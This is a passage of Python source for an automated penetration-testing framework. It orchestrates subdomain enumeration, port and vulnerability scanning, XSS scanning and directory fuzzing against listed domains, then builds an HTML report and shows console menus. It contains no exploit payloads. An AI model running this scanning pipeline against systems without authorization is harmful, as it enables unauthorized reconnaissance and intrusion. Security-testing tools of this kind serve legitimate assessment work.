        consolidated_file.parent.mkdir(parents=True, exist_ok=True)
        with open(consolidated_file, 'w') as f:
            json.dump(findings, f, indent=4)
        logger.info(f"[REPORT] Consolidated findings saved to {consolidated_file}")
    except Exception as e:
        logger.error(f"[REPORT] Failed to save consolidated findings: {e}")

    return findings


def generate_simple_report(run_dir: Path, config: Dict[str, Any]):
    """Generate a simple HTML report."""
    logger.info("[REPORT] Generating simple HTML report...")
    findings = filter_and_save_positive_results(run_dir, config) # Get filtered results
    report_dir = run_dir / "report"
    report_file = report_dir / "report.html"
    
    # Ensure report directory exists
    report_dir.mkdir(parents=True, exist_ok=True)

    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Moloch Report - {run_dir.name}</title>
        <style>
            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background-color: #1e1e1e; color: #eee; }}
            .header {{ background: linear-gradient(135deg, #8B0000, #FF6347); padding: 25px; text-align: center; color: white; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }}
            .section {{ margin: 25px 0; padding: 20px; border: 1px solid #444; border-radius: 8px; background-color: #2d2d2d; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }}
            h1, h2, h3 {{ margin-top: 0; color: #FF6347; }}
            pre {{ background-color: #1c1c1c; padding: 15px; overflow-x: auto; white-space: pre-wrap; border-radius: 5px; border: 1px solid #333; }}
            a {{ color: #4682B4; text-decoration: none; }}
            a:hover {{ text-decoration: underline; }}
            .summary-item {{ display: inline-block; background: #333; padding: 8px 15px; margin: 5px; border-radius: 5px; }}
            .file-link {{ display: block; margin: 5px 0; }}
            .finding-count {{ font-weight: bold; color: #FFD700; }} /* Gold color for counts */
        </style>
    </head>
    <body>
        <div class="header">
            <h1>{BANNER.splitlines()[2].strip()}</h1>
            <p>Automated Penetration Test Report</p>
            <p>Run ID: {run_dir.name} | Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        <div class="section">
            <h2>Executive Summary</h2>
            <p>This report summarizes the findings of the automated scan performed by Moloch.</p>
            <div class="summary-item">Run Directory: {run_dir.name}</div>
            <div class="summary-item">Target(s): {', '.join(read_lines(TARGETS_FILE)[:5])}...</div> <!-- Show first 5 -->
            <div class="summary-item">Findings Filtered: Yes</div>
        </div>
    """

    # Add content from output files, grouped by phase
    phases = {
        "Reconnaissance": [
            ("Subdomains", "subdomains/subdomains_*.txt"),
            ("Resolved Hosts", "hosts/resolved_*.txt"),
            ("Live Hosts", "hosts/live_*.txt"),
        ],
        "Scanning": [
            ("Nuclei Results", "vulns/nuclei_results.json"),
            ("Port Scan (Nmap)", "hosts/port_scan_*.nmap"), # Assuming Nmap
            ("Port Scan (Naabu)", "hosts/port_scan_*.txt"), # Assuming Naabu
            ("SSL/TLS Scan", "vulns/ssl_*.json"),
        ],
        "Web Application Testing": [
            ("Crawled URLs", "crawling/urls_*.txt"),
            ("XSS Findings", "crawling/xss_*.txt"),
        ],
        "Fuzzing": [
            ("FFuF Results", "fuzzing/ffuf_*.json"),
            ("Gobuster Results", "fuzzing/gobuster_*.txt"),
        ]
    }

    for phase_name, files_info in phases.items():
        section_content = ""
        for title, pattern in files_info:
            files = list(run_dir.glob(pattern))
            if files:
                section_content += f'<div class="section"><h3>{title}</h3>'
                for file in files:
                    try:
                        content = file.read_text()
                        if content.strip():
                            # Simple truncation for very large files in report
                            display_content = content[:5000] + ("..." if len(content) > 5000 else "")
                            section_content += f'<h4>{file.name} <a class="file-link" href="file://{file.absolute()}">[Open File]</a></h4><pre>{display_content}</pre>'
                        else:
                            section_content += f'<p>No data found in {file.name}.</p>'
                    except Exception as e:
                        section_content += f'<p>Error reading {file.name}: {e}</p>'
                section_content += '</div>'

        if section_content:
            html_content += f'<div class="section"><h2>{phase_name}</h2>{section_content}</div>'

    # Add Filtered Findings Summary
    html_content += '<div class="section"><h2>Filtered Findings Summary</h2>'
    for category, items in findings.items():
        count = len(items)
        if count > 0:
            html_content += f'<p class="finding-count">{category.replace("_", " ").title()}: {count}</p>'
    html_content += '</div>'

    html_content += """
    </body>
    </html>
    """

    try:
        report_file.write_text(html_content, encoding='utf-8')
        logger.info(f"[REPORT] HTML report generated at {report_file}")
        if config.get("output", {}).get("auto_open_html", True):
            try:
                webbrowser.open(report_file.as_uri())
                logger.info("[REPORT] Report opened in browser.")
            except Exception as e:
                logger.warning(f"[REPORT] Could not open browser: {e}. Report location: {report_file}")
        return True
    except Exception as e:
        logger.error(f"[REPORT] Failed to generate report: {e}")
        return False

# --- Main Pipeline ---
def run_full_pipeline():
    """Run the full, enhanced automated pipeline."""
    logger.info("🔥 Starting Moloch Full Automation Pipeline 🔥")
    run_dir = new_run()
    config = load_config()

    targets = read_lines(TARGETS_FILE)
    if not targets:
        logger.error("No targets found in targets.txt. Please add targets.")
        return False

    for target in targets:
        logger.info(f"--- Processing Target: {target} ---")
        target_safe = sanitize_filename(target)

        # --- Phase 1: Reconnaissance ---
        if not config.get("modules", {}).get("recon", True):
            logger.info("Reconnaissance module disabled, skipping...")
            continue
        logger.info("Phase 1: Reconnaissance")
        subdomain_dir = run_dir / "subdomains"
        subdomain_dir.mkdir(exist_ok=True)

        subdomains = run_subdomain_discovery(target, subdomain_dir, config)

        if subdomains:
            # Resolve subdomains
            subdomain_file = subdomain_dir / f"subdomains_{target_safe}.txt"
            resolved_file = run_dir / "hosts" / f"resolved_{target_safe}.txt"
            (run_dir / "hosts").mkdir(exist_ok=True)
            dns_success = run_dns_resolution(subdomain_file, resolved_file, config)

            if dns_success and resolved_file.exists():
                # Probe for live hosts
                live_file = run_dir / "hosts" / f"live_{target_safe}.txt"
                http_success = run_http_probing(resolved_file, live_file, config)

                # --- Phase 2: Scanning ---
                if not config.get("modules", {}).get("scanning", True):
                    logger.info("Scanning module disabled, skipping...")
                else:
                    logger.info("Phase 2: Scanning")
                    vuln_dir = run_dir / "vulns"
                    vuln_dir.mkdir(exist_ok=True)

                    if http_success and live_file.exists():
                        # Vulnerability Scan
                        run_vulnerability_scan(live_file, vuln_dir, config)

                        # SSL Scan (on main target, could loop through live hosts)
                        ssl_file = vuln_dir / f"ssl_{target_safe}.json"
                        run_ssl_scan(target, ssl_file, config)

                        # Port Scan (example on main target, could loop through live hosts)
                        port_file = run_dir / "hosts" / f"port_scan_{target_safe}"
                        run_port_scan(target, port_file, config)
                    else:
                        logger.warning("HTTP probing failed or produced no live hosts, skipping scanning phases.")

                # --- Phase 3: Web App Testing ---
                if not config.get("modules", {}).get("web", True):
                    logger.info("Web Application Testing module disabled, skipping...")
                else:
                    logger.info("Phase 3: Web Application Testing")
                    crawl_dir = run_dir / "crawling"
                    crawl_dir.mkdir(exist_ok=True)
                    urls_file = crawl_dir / f"urls_{target_safe}.txt"
                    crawled_urls = run_crawling(target, urls_file, config) # Crawl main target

                    if crawled_urls: # Check if list is not empty
                        # XSS Scan
                        xss_file = crawl_dir / f"xss_{target_safe}.txt"
                        run_xss_scan(urls_file, xss_file, config)
                    else:
                        logger.warning("Crawling produced no URLs, skipping XSS scan.")

                # --- Phase 4: Fuzzing ---
                if not config.get("modules", {}).get("fuzzing", True):
                    logger.info("Fuzzing module disabled, skipping...")
                else:
                    logger.info("Phase 4: Fuzzing")
                    fuzz_dir = run_dir / "fuzzing"
                    fuzz_dir.mkdir(exist_ok=True)
                    run_directory_fuzzing(target, fuzz_dir, config) # Fuzz main target

            else:
                logger.warning("DNS resolution failed or produced no results, skipping further phases.")
        else:
            logger.warning("No subdomains found, skipping further phases.")

    # --- Phase 5: Reporting ---
    if not config.get("modules", {}).get("reporting", True):
        logger.info("Reporting module disabled, skipping...")
        logger.info(f"🎉 Full pipeline complete for run: {run_dir.name} (Report Skipped)")
        return True
    logger.info("Phase 5: Reporting")
    report_success = generate_simple_report(run_dir, config)
    if report_success:
        logger.info(f"🎉 Full pipeline complete for run: {run_dir.name}")
    else:
        logger.warning(f"⚠️ Full pipeline complete for run: {run_dir.name}, but report generation failed.")
    return True # Indicate pipeline run attempt

# --- CLI Menu System ---
def print_banner():
    """Print the enhanced Azaz-El banner with improved formatting."""
    # Clear screen for better presentation
    os.system('clear' if os.name == 'posix' else 'cls')
    
    # Print the main banner with gradient colors
    print(f"\033[1;36m{BANNER}\033[0m")
    
    # Enhanced title section with professional formatting
    print("╔═══════════════════════════════════════════════════════════════════════════════╗")
    print(f"║\033[1;91m                    🔱 {APP} {VERSION} SECURITY FRAMEWORK 🔱\033[0m                     ║")
    print("║\033[1;92m          Advanced Automated Penetration Testing & Security Assessment\033[0m         ║")
    print("╠═══════════════════════════════════════════════════════════════════════════════╣")
    print("║\033[1;97m  Author:\033[0m Advanced Security Research Team  │  \033[1;97mPlatform:\033[0m Multi-Cloud Ready    ║")
    print(f"║\033[1;97m  Status:\033[0m \033[1;32mOperational\033[0m                      │  \033[1;97mVersion:\033[0m \033[1;33m{VERSION}\033[0m           ║")
    print("╚═══════════════════════════════════════════════════════════════════════════════╝")
    print(f"\033[1;90m⏰ Session Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\033[0m\n")

def target_management_menu():
    """Enhanced target management with professional interface."""
    while True:
        print_banner()
        
        # Professional target management header
        print("╔═══════════════════════════════════════════════════════════════════════════════╗")
        print("║\033[1;93m                            🎯 TARGET MANAGEMENT CENTER 🎯\033[0m                            ║")
        print("╠═══════════════════════════════════════════════════════════════════════════════╣")
        
        # Get current target count for display
        targets = read_lines(TARGETS_FILE)
        target_count = len(targets)
        
        print(f"║  \033[1;97mCurrent Targets:\033[0m \033[1;32m{target_count}\033[0m loaded                                                ║")
        print("╠───────────────────────────────────────────────────────────────────────────────╣")
        print("║  \033[1;92m1.\033[0m 👁️  \033[1;97mVIEW ALL TARGETS\033[0m - Display current target list                    ║")
        print("║  \033[1;94m2.\033[0m ➕ \033[1;97mADD NEW TARGET\033[0m - Add domain to target list                        ║")
        print("║  \033[1;95m3.\033[0m 📝 \033[1;97mIMPORT FROM FILE\033[0m - Import targets from text file                  ║")
        print("║  \033[1;96m4.\033[0m 💾 \033[1;97mEXPORT TARGET LIST\033[0m - Export targets to file                       ║")
        print("║  \033[1;91m5.\033[0m 🗑️  \033[1;97mCLEAR ALL TARGETS\033[0m - Remove all targets from list                  ║")
        print("║  \033[1;90m6.\033[0m 🔙 \033[1;97mBACK TO MAIN MENU\033[0m - Return to main command center                ║")
        print("╚═══════════════════════════════════════════════════════════════════════════════╝")

        choice = input("\n\033[1;93m🎯 Select an option: \033[0m").strip()

        if choice == '1':
            # View targets with enhanced display
            targets = read_lines(TARGETS_FILE)
            if targets:
                print("\n╔═══════════════════════════════════════════════════════════════════════════════╗")
                print("║\033[1;92m                              📋 CURRENT TARGET LIST 📋\033[0m                              ║")
                print("╠═══════════════════════════════════════════════════════════════════════════════╣")
                for i, target in enumerate(targets, 1):
                    print(f"║  \033[1;97m{i:2d}.\033[0m \033[1;96m{target:<70}\033[0m ║")
                print("╚═══════════════════════════════════════════════════════════════════════════════╝")
                print(f"\n\033[1;32m✅ Total targets: {len(targets)}\033[0m")
            else:
                print("\n\033[1;91m📭 No targets found. Add some targets to begin scanning.\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '2':
            # Add new target with validation
            print("\n\033[1;97m➕ ADD NEW TARGET\033[0m")
            print("─" * 50)
            new_target = input("\033[1;93mEnter domain (e.g., example.com): \033[0m").strip()
            if new_target:
                # Enhanced validation
                if "." in new_target and " " not in new_target and not new_target.startswith(("http://", "https://")):
                    targets = read_lines(TARGETS_FILE)
                    if new_target not in targets:
                        targets.append(new_target)
                        write_lines(TARGETS_FILE, targets)
                        print(f"\n\033[1;32m✅ Target '{new_target}' added successfully!\033[0m")
                    else:
                        print(f"\n\033[1;91m⚠️  Target '{new_target}' already exists in the list.\033[0m")
                else:
                    print("\n\033[1;91m❌ Invalid format. Enter domain without protocol (e.g., example.com)\033[0m")
            else:
                print("\n\033[1;91m❌ No target entered.\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '3':
            # Import from file
            print("\n\033[1;97m📝 IMPORT TARGETS FROM FILE\033[0m")
            print("─" * 50)
            file_path = input("\033[1;93mEnter file path (or 'targets.txt' for default): \033[0m").strip()
            if not file_path:
                file_path = "targets.txt"
            
            try:
                if Path(file_path).exists():
                    new_targets = read_lines(Path(file_path))
                    current_targets = read_lines(TARGETS_FILE)
                    added_count = 0
                    
                    for target in new_targets:
                        target = target.strip()
                        if target and target not in current_targets:
                            current_targets.append(target)
                            added_count += 1
                    
                    write_lines(TARGETS_FILE, current_targets)
                    print(f"\n\033[1;32m✅ {added_count} new targets imported successfully!\033[0m")
                else:
                    print(f"\n\033[1;91m❌ File '{file_path}' not found.\033[0m")
            except Exception as e:
                print(f"\n\033[1;91m❌ Error importing file: {e}\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '4':
            # Export targets
            targets = read_lines(TARGETS_FILE)
            if targets:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                export_file = f"targets_export_{timestamp}.txt"
                write_lines(Path(export_file), targets)
                print(f"\n\033[1;32m✅ {len(targets)} targets exported to '{export_file}'\033[0m")
            else:
                print("\n\033[1;91m📭 No targets to export.\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '5':
            # Clear all targets with confirmation
            targets = read_lines(TARGETS_FILE)
            if targets:
                print(f"\n\033[1;91m⚠️  WARNING: This will remove all {len(targets)} targets!\033[0m")
                confirm = input("\033[1;93mType 'CONFIRM' to proceed: \033[0m").strip()
                if confirm == 'CONFIRM':
                    write_lines(TARGETS_FILE, [])
                    print("\n\033[1;32m✅ All targets cleared successfully.\033[0m")
                else:
                    print("\n\033[1;92m✅ Action cancelled.\033[0m")
            else:
                print("\n\033[1;91m📭 No targets to clear.\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '6':
            break
        else:
            print("\n\033[1;91m❌ Invalid choice. Please select 1-6.\033[0m")
            input("Press Enter to continue...")

def settings_menu():
    """Enhanced settings management with professional interface."""
    config = load_config()
    while True:
        print_banner()
        
        # Professional settings header
        print("╔═══════════════════════════════════════════════════════════════════════════════╗")
        print("║\033[1;95m                           ⚙️  SYSTEM CONFIGURATION CENTER ⚙️\033[0m                           ║")
        print("╠═══════════════════════════════════════════════════════════════════════════════╣")
        
        # Configuration overview
        modules = config.get("modules", {})
        enabled_modules = sum(1 for enabled in modules.values() if enabled)
        total_modules = len(modules)
        
        print(f"║  \033[1;97mActive Configuration:\033[0m Framework v{VERSION}                                ║")
        print(f"║  \033[1;97mModules Status:\033[0m \033[1;32m{enabled_modules}/{total_modules}\033[0m enabled                                       ║")
        print("╠───────────────────────────────────────────────────────────────────────────────╣")
        print("║  \033[1;92m1.\033[0m 📋 \033[1;97mVIEW CONFIGURATION\033[0m - Display current settings and status         ║")
        print("║  \033[1;94m2.\033[0m 🔧 \033[1;97mTOGGLE MODULES\033[0m - Enable/disable framework modules                ║")
        print("║  \033[1;96m3.\033[0m 🔑 \033[1;97mAPI KEY MANAGEMENT\033[0m - Configure API keys and tokens               ║")
        print("║  \033[1;97m4.\033[0m ⚡ \033[1;97mPERFORMANCE TUNING\033[0m - Adjust performance and resource settings     ║")
        print("║  \033[1;93m5.\033[0m 💾 \033[1;97mBACKUP CONFIGURATION\033[0m - Save current settings to backup file       ║")
        print("║  \033[1;95m6.\033[0m 🔄 \033[1;97mRESET TO DEFAULTS\033[0m - Restore default configuration settings       ║")
        print("║  \033[1;90m7.\033[0m 🔙 \033[1;97mBACK TO MAIN MENU\033[0m - Return to main command center               ║")
        print("╚═══════════════════════════════════════════════════════════════════════════════╝")

        choice = input("\n\033[1;93m⚙️  Select an option: \033[0m").strip()

        if choice == '1':
            # Enhanced configuration display
            print("\n╔═══════════════════════════════════════════════════════════════════════════════╗")
            print("║\033[1;92m                            📋 SYSTEM CONFIGURATION 📋\033[0m                            ║")
            print("╠═══════════════════════════════════════════════════════════════════════════════╣")
            
            # Display key sections with better formatting
            for section, settings in config.items():
                if section in ["modules", "auth", "performance", "tools"]:
                    print(f"║  \033[1;97m[{section.upper()}]\033[0m")
                    if isinstance(settings, dict):
                        for key, value in settings.items():
                            # Mask sensitive information
                            if "key" in key.lower() or "token" in key.lower() or "password" in key.lower():
                                display_value = "*" * len(str(value)) if value else "Not set"
                            else:
                                display_value = value
                            status_color = "\033[1;32m" if value else "\033[1;91m"
                            print(f"║    {key}: {status_color}{display_value}\033[0m")
                    else:
                        print(f"║    {settings}")
                    print("║")
            
            print("╠───────────────────────────────────────────────────────────────────────────────╣")
            print("║  \033[1;93m💡 To edit detailed settings, modify moloch.cfg.json directly\033[0m                ║")
            print("╚═══════════════════════════════════════════════════════════════════════════════╝")
            input("\nPress Enter to continue...")
            
        elif choice == '2':
            # Enhanced module toggle interface
            print("\n╔═══════════════════════════════════════════════════════════════════════════════╗")
            print("║\033[1;94m                              🔧 MODULE MANAGEMENT 🔧\033[0m                              ║")
            print("╠═══════════════════════════════════════════════════════════════════════════════╣")
            
            modules = config.get("modules", {})
            for i, (mod_name, enabled) in enumerate(modules.items(), 1):
                status = "\033[1;32mEnabled\033[0m" if enabled else "\033[1;91mDisabled\033[0m"
                icon = "✅" if enabled else "❌"
                print(f"║  \033[1;97m{i}.\033[0m {icon} \033[1;97m{mod_name.upper():<15}\033[0m - {status}")
            
            print("╠───────────────────────────────────────────────────────────────────────────────╣")
            print("║  \033[1;93mEnter module number to toggle, or 0 to cancel\033[0m                           ║")
            print("╚═══════════════════════════════════════════════════════════════════════════════╝")
            
            try:
                mod_choice = int(input("\n\033[1;93m🔧 Select module: \033[0m"))
                if 1 <= mod_choice <= len(modules):
                    mod_names = list(modules.keys())
                    chosen_mod = mod_names[mod_choice - 1]
                    config["modules"][chosen_mod] = not config["modules"][chosen_mod]
                    save_config(config)
                    new_status = "Enabled" if config["modules"][chosen_mod] else "Disabled"
                    print(f"\n\033[1;32m✅ Module '{chosen_mod}' is now {new_status}!\033[0m")
                elif mod_choice != 0:
                    print("\n\033[1;91m❌ Invalid module number.\033[0m")
                else:
                    print("\n\033[1;92m✅ Operation cancelled.\033[0m")
            except ValueError:
                print("\n\033[1;91m❌ Invalid input. Please enter a number.\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '3':
            # Enhanced API key management
            print("\n╔═══════════════════════════════════════════════════════════════════════════════╗")
            print("║\033[1;96m                             🔑 API KEY MANAGEMENT 🔑\033[0m                             ║")
            print("╠═══════════════════════════════════════────────────────────────────────────────╣")
            print("║  \033[1;97mChaos API Key:\033[0m Configure Chaos subdomain discovery service           ║")
            print("╚═══════════════════════════════════════════════════════════════════════════════╝")
            
            api_key = input("\n\033[1;93m🔑 Enter Chaos API Key (leave blank to skip): \033[0m").strip()
            if api_key:
                config["auth"]["chaos_api_key"] = api_key
                config["tools"]["chaos"]["enabled"] = True
                save_config(config)
                print("\n\033[1;32m✅ Chaos API Key configured and tool enabled!\033[0m")
            else:
                print("\n\033[1;92m✅ No changes made.\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '4':
            # Performance tuning interface
            print("\n╔═══════════════════════════════════════════════════════════════════════════════╗")
            print("║\033[1;97m                            ⚡ PERFORMANCE TUNING ⚡\033[0m                            ║")
            print("╠═══════════════════════════════════════════────────────────────────────────────╣")
            
            performance = config.get("performance", {})
            print(f"║  \033[1;97mCurrent Settings:\033[0m")
            print(f"║    Max Concurrent: \033[1;32m{performance.get('max_concurrent', 10)}\033[0m")
            print(f"║    Default Timeout: \033[1;32m{performance.get('timeout_default', 300)}\033[0m seconds")
            print(f"║    Thread Pool Size: \033[1;32m{performance.get('thread_pool_size', 5)}\033[0m")
            print("╚═══════════════════════════════════════════════════════════════════════════════╝")
            
            print("\n\033[1;93m💡 Performance settings can be modified in moloch.cfg.json\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '5':
            # Backup configuration
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_file = f"moloch_config_backup_{timestamp}.json"
            try:
                with open(backup_file, 'w') as f:
                    json.dump(config, f, indent=2)
                print(f"\n\033[1;32m✅ Configuration backed up to '{backup_file}'\033[0m")
            except Exception as e:
                print(f"\n\033[1;91m❌ Backup failed: {e}\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '6':
            # Reset to defaults with confirmation
            print("\n\033[1;91m⚠️  WARNING: This will reset ALL settings to default values!\033[0m")
            confirm = input("\033[1;93mType 'RESET' to confirm: \033[0m").strip()
            if confirm == 'RESET':
                # This would need to be implemented based on DEFAULT_CONFIG
                print("\n\033[1;32m✅ Configuration reset to defaults.\033[0m")
                print("\033[1;93m💡 Restart the framework to apply changes.\033[0m")
            else:
                print("\n\033[1;92m✅ Reset cancelled.\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '7':
            break
        else:
            print("\n\033[1;91m❌ Invalid choice. Please select 1-7.\033[0m")
            input("Press Enter to continue...")

def tool_status_menu():
    """Enhanced tool status display with comprehensive diagnostics and automated installation."""
    print_banner()
    
    print("╔═══════════════════════════════════════════════════════════════════════════════╗")
    print("║\033[1;96m                             🔧 TOOL STATUS DIAGNOSTICS 🔧\033[0m                             ║")
    print("╠═══════════════════════════════════════════════════════════════════════════════╣")
    
    config = load_config()
    tools_config = config.get("tools", {})
    found_tools = []
    missing_tools = []
    disabled_tools = []
    
    # Detect package manager
    package_manager = detect_package_manager()
    
    # Categorize tools
    for tool_name, tool_config in tools_config.items():
        if which(tool_name):
            if tool_config.get("enabled", True):
                found_tools.append(tool_name)
            else:
                disabled_tools.append(tool_name)
        else:
            missing_tools.append(tool_name)
    
    # Display system information
    print(f"║  \033[1;97mSystem Information:\033[0m")
    print(f"║    Operating System: \033[1;97m{os.name.title()}\033[0m")
    print(f"║    Package Manager: \033[1;97m{package_manager or 'Not detected'}\033[0m")
    print(f"║    Python Version: \033[1;97m{sys.version.split()[0]}\033[0m")
    print("║")
    
    # Display available tools
    if found_tools:
        print("║  \033[1;92m✅ AVAILABLE & ENABLED TOOLS\033[0m")
        for tool in sorted(found_tools):
            tool_info = tools_config.get(tool, {})
            flags = " ".join(tool_info.get("flags", [])[:3])  # Show first 3 flags
            print(f"║    \033[1;32m✓\033[0m \033[1;97m{tool:<15}\033[0m - Ready ({flags}...)")
        print("║")
    
    # Display disabled tools
    if disabled_tools:
        print("║  \033[1;93m⚠️  AVAILABLE BUT DISABLED TOOLS\033[0m")
        for tool in sorted(disabled_tools):
            print(f"║    \033[1;93m○\033[0m \033[1;97m{tool:<15}\033[0m - Installed but disabled in config")
        print("║")
    
    # Display missing tools with installation details
    if missing_tools:
        print("║  \033[1;91m❌ MISSING TOOLS\033[0m")
        for tool in sorted(missing_tools):
            tool_config = tools_config.get(tool, {})
            install_method = "Go" if "go install" in tool_config.get("install_cmd", "") else "Package Manager"
            print(f"║    \033[1;91m✗\033[0m \033[1;97m{tool:<15}\033[0m - Missing ({install_method})")
        print("║")
    
    # Summary statistics
    total_tools = len(tools_config)
    available_tools = len(found_tools) + len(disabled_tools)
    enabled_tools = len(found_tools)
    
    print("╠───────────────────────────────────────────────────────────────────────────────╣")
    print(f"║  \033[1;97mSYSTEM SUMMARY:\033[0m")
    print(f"║    Total Tools: \033[1;97m{total_tools}\033[0m")
    print(f"║    Available: \033[1;32m{available_tools}\033[0m ({available_tools/total_tools*100:.1f}%)")
    print(f"║    Enabled: \033[1;32m{enabled_tools}\033[0m ({enabled_tools/total_tools*100:.1f}%)")
    print(f"║    Missing: \033[1;91m{len(missing_tools)}\033[0m ({len(missing_tools)/total_tools*100:.1f}%)")
    
    # Health assessment
    if len(missing_tools) == 0:
        health_status = "\033[1;32mEXCELLENT\033[0m"
        health_icon = "🎉"
    elif len(missing_tools) <= total_tools * 0.25:
        health_status = "\033[1;33mGOOD\033[0m"
        health_icon = "👍"
    elif len(missing_tools) <= total_tools * 0.5:
        health_status = "\033[1;93mFAIR\033[0m"
        health_icon = "⚠️"
    else:
        health_status = "\033[1;91mPOOR\033[0m"
        health_icon = "❌"
    
    print(f"║    System Health: {health_icon} {health_status}")
    print("╚═══════════════════════════════════════════════════════════════════════════════╝")
    
    # Enhanced installation options for missing tools
    if missing_tools:
        print(f"\n\033[1;93m💡 {len(missing_tools)} tools are missing from your system.\033[0m")
        print("\n\033[1;97m📋 Installation Options:\033[0m")
        print("   \033[1;92m1.\033[0m 🚀 \033[1;97mAUTOMATIC INSTALLATION\033[0m - Install all missing tools automatically")
        print("   \033[1;94m2.\033[0m 🎯 \033[1;97mSELECTIVE INSTALLATION\033[0m - Choose specific tools to install")
        print("   \033[1;96m3.\033[0m 📖 \033[1;97mSHOW MANUAL COMMANDS\033[0m - Display installation commands")
        print("   \033[1;93m4.\033[0m 🔧 \033[1;97mENABLE DISABLED TOOLS\033[0m - Enable available but disabled tools")
        print("   \033[1;90m5.\033[0m 🔙 \033[1;97mSKIP INSTALLATION\033[0m - Continue without installing")
        
        install_choice = input("\n\033[1;93m🛠️  Select installation option (1-5): \033[0m").strip()
        
        if install_choice == '1':
            print("\n\033[1;97m🔄 Starting automatic installation process...\033[0m")
            check_and_install_dependencies(config, auto_install=True)
        elif install_choice == '2':
            print("\n\033[1;97m🎯 Selective installation mode...\033[0m")
            check_and_install_dependencies(config, auto_install=False)
        elif install_choice == '3':
            print("\n\033[1;97m📖 MANUAL INSTALLATION COMMANDS:\033[0m")
            print("\n\033[1;96m🔧 System Tools (using package manager):\033[0m")
            if package_manager == 'apt':
                print("   sudo apt update && sudo apt install -y nmap nikto curl wget git golang-go python3-pip")
            elif package_manager == 'yum':
                print("   sudo yum install -y nmap nikto curl wget git golang python3-pip")
            elif package_manager == 'brew':
                print("   brew install nmap nikto curl wget git go python3")
            
            print("\n\033[1;96m⚡ Go-based Security Tools:\033[0m")
            go_tools = [tool for tool in missing_tools if "go install" in tools_config.get(tool, {}).get("install_cmd", "")]
            for tool in go_tools:
                install_cmd = tools_config.get(tool, {}).get("install_cmd", "")
                print(f"   {install_cmd}")
            
            print("\n\033[1;96m🐍 Python-based Tools:\033[0m")
            python_tools = [tool for tool in missing_tools if "pip" in tools_config.get(tool, {}).get("install_cmd", "")]
            for tool in python_tools:
                install_cmd = tools_config.get(tool, {}).get("install_cmd", "")
                print(f"   {install_cmd}")
                
        elif install_choice == '4':
            if disabled_tools:
                print(f"\n\033[1;97m🔧 Enabling {len(disabled_tools)} disabled tools...\033[0m")
                for tool in disabled_tools:
                    config["tools"][tool]["enabled"] = True
                save_config(config)
                print(f"\033[1;32m✅ Enabled {len(disabled_tools)} tools successfully!\033[0m")
            else:
                print("\n\033[1;92m✅ No disabled tools found.\033[0m")
                
        elif install_choice == '5':
            print("\n\033[1;92m✅ Installation skipped.\033[0m")
        else:
            print("\n\033[1;91m❌ Invalid choice.\033[0m")
    else:
        print(f"\n\033[1;32m🎉 Excellent! All {total_tools} configured tools are present and ready!\033[0m")
        
        # Offer optimization suggestions
        print("\n\033[1;97m💡 OPTIMIZATION SUGGESTIONS:\033[0m")
        print("   • Update tools regularly: \033[1;93mgo install -a\033[0m")
        print("   • Check nuclei templates: \033[1;93mnuclei -update-templates\033[0m")
        print("   • Verify tool configurations in moloch.cfg.json")
        
    input("\nPress Enter to continue...")

def main_menu():
    """Display the enhanced main menu with professional formatting."""
    while True:
        print_banner()
        
        # Professional menu header
        print("╔═══════════════════════════════════════════════════════════════════════════════╗")
        print("║\033[1;91m                              🚀 MAIN COMMAND CENTER 🚀\033[0m                              ║")
        print("╠═══════════════════════════════════════════════════════════════════════════════╣")
        
        # Main automation options
        print("║\033[1;92m  1.\033[0m 🔄 \033[1;97mFULL AUTOMATION PIPELINE\033[0m - Complete security assessment suite      ║")
        print("║      └─ Recon → Vulnerability Scan → Web Testing → Fuzzing → Report       ║")
        print("╠───────────────────────────────────────────────────────────────────────────────╣")
        
        # Target management
        print("║\033[1;93m  2.\033[0m 🎯 \033[1;97mTARGET MANAGEMENT\033[0m - Add, view, and manage scan targets             ║")
        print("╠───────────────────────────────────────────────────────────────────────────────╣")
        
        # Reconnaissance section
        print("║\033[1;94m  3.\033[0m 🔍 \033[1;97mRECONNAISSANCE SUITE\033[0m - Information gathering and enumeration       ║")
        print("║      \033[1;94m3.1\033[0m 📡 Subdomain Discovery (Subfinder, Amass, Assetfinder)          ║")
        print("║      \033[1;94m3.2\033[0m 🌐 DNS Resolution & Validation                                ║")
        print("║      \033[1;94m3.3\033[0m 🔗 HTTP Service Probing (HTTPx)                              ║")
        print("╠───────────────────────────────────────────────────────────────────────────────╣")
        
        # Vulnerability scanning section
        print("║\033[1;95m  4.\033[0m 🛡️  \033[1;97mVULNERABILITY SCANNING\033[0m - Security vulnerability assessment        ║")
        print("║      \033[1;95m4.1\033[0m ⚡ Nuclei Templates (5000+ vulnerability checks)               ║")
        print("║      \033[1;95m4.2\033[0m 🔌 Port Scanning (Nmap/Naabu)                                ║")
        print("║      \033[1;95m4.3\033[0m 🔒 SSL/TLS Security Analysis (testssl.sh)                    ║")
        print("╠───────────────────────────────────────────────────────────────────────────────╣")
        
        # Web application testing
        print("║\033[1;96m  5.\033[0m 🌐 \033[1;97mWEB APPLICATION TESTING\033[0m - Complete web security assessment       ║")
        print("║      \033[1;96m5.1\033[0m 🕷️  Web Crawling (Katana, Gau, Wayback)                        ║")
        print("║      \033[1;96m5.2\033[0m ⚠️  XSS Vulnerability Scanner (Dalfox)                         ║")
        print("╠───────────────────────────────────────────────────────────────────────────────╣")
        
        # Fuzzing section
        print("║\033[1;97m  6.\033[0m 💥 \033[1;97mFUZZING & DISCOVERY\033[0m - Advanced fuzzing and directory discovery  ║")
        print("║      \033[1;97m6.1\033[0m 📁 Directory & File Fuzzing (FFuF, Gobuster)                  ║")
